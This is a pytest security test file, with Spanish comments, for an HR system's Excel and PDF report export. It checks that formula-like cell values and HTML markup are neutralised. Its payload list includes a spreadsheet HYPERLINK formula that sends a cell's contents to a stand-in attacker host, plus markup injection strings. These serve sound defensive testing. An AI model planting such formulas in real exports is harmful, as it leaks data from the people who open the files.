"""Lo que sale del sistema no debe ejecutarse en la máquina de quien lo abre."""

from __future__ import annotations

import datetime as dt
from io import BytesIO

import pytest
from openpyxl import load_workbook
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.platypus import Paragraph

from apps.reports import services
from apps.reports.builders import Column, Filters, ReportResult
from apps.reports.pdf import _text, build_pdf

PERIOD = Filters(date_from=dt.date(2025, 3, 3), date_to=dt.date(2025, 3, 7))


def _result(value: str) -> ReportResult:
    return ReportResult(
        columns=[Column("employee", "Empleado"), Column("title", "Título")],
        rows=[{"employee": "Ana Pérez", "title": value}],
        totals={},
    )


@pytest.mark.security
@pytest.mark.parametrize(
    "payload",
    [
        '=HYPERLINK("https://atacante.example/?d="&B2,"Abrir")',
        "=1+1",
        "+1+1",
        "-1+1",
        "@SUM(A1)",
    ],
)
def test_a_text_that_looks_like_a_formula_is_written_as_text(payload) -> None:
    """Quien sube un documento no debe poder ejecutar nada en el Excel de RRHH."""
    content = services.export_to_excel(slug="documents", result=_result(payload), filters=PERIOD)

    sheet = load_workbook(BytesIO(content)).active
    cells = [cell for row in sheet.iter_rows() for cell in row if cell.value]
    formulas = [cell.value for cell in cells if cell.data_type == "f"]

    assert not formulas, f"Excel tomaría esto por fórmula: {formulas}"


def test_ordinary_text_is_not_disfigured() -> None:
    """La defensa no debe ensuciar lo que no era peligroso."""
    content = services.export_to_excel(
        slug="documents", result=_result("Contrato firmado"), filters=PERIOD
    )

    sheet = load_workbook(BytesIO(content)).active
    values = [cell.value for row in sheet.iter_rows() for cell in row if cell.value]

    assert "Contrato firmado" in values


def test_numbers_keep_being_numbers() -> None:
    """Si los importes salieran como texto, las sumas de la hoja no funcionarían."""
    result = ReportResult(
        columns=[Column("hours", "Horas", numeric=True)],
        rows=[{"hours": 42.5}],
        totals={"hours": 42.5},
    )

    content = services.export_to_excel(slug="attendance", result=result, filters=PERIOD)

    sheet = load_workbook(BytesIO(content)).active
    numbers = [cell.value for row in sheet.iter_rows() for cell in row if cell.data_type == "n"]

    assert 42.5 in numbers


@pytest.mark.security
def test_the_pdf_does_not_interpret_markup_in_the_filters() -> None:
    """Un `<img>` en un nombre de área haría que **el servidor** cargue ese recurso.

    La prueba es por contraste y sin salir a la red: con una ruta local
    inexistente, el mismo texto **sin escapar** hace reventar a ReportLab al
    intentar abrirla; escapado, el PDF se genera sin tocar el disco.
    """
    payload = '<img src="no-existe-12345.png" width="10" height="10"/>'
    style = getSampleStyleSheet()["Normal"]

    with pytest.raises(Exception, match=r"(?i)img|fileName|exception"):
        Paragraph(payload, style).wrap(300, 300)

    content, _truncated = build_pdf(
        title="Reporte",
        result=_result("Contrato"),
        filters_text=f"2025-03-03 — 2025-03-07 · {payload}",
        generated_by="Ana Pérez",
        generated_at="2026-09-27 10:00",
        report_url="https://rrhh.example.com/reportes/documents/",
    )

    assert content.startswith(b"%PDF-")


@pytest.mark.security
def test_the_title_and_the_signature_are_escaped_too() -> None:
    """El mismo escape debe cubrir el título y la firma, no solo las celdas."""
    assert _text('<a href="https://atacante.example">x</a>') == (
        "&lt;a href=&quot;https://atacante.example&quot;&gt;x&lt;/a&gt;".replace("&quot;", '"')
    )

    content, _truncated = build_pdf(
        title='<a href="https://atacante.example">Reporte</a>',
        result=_result("Contrato"),
        filters_text="2025-03-03 — 2025-03-07",
        generated_by="Ana & Asociados",  # el ampersand no debe romper el PDF
        generated_at="2026-09-27 10:00",
        report_url="https://rrhh.example.com/reportes/documents/",
    )

    assert content.startswith(b"%PDF-")
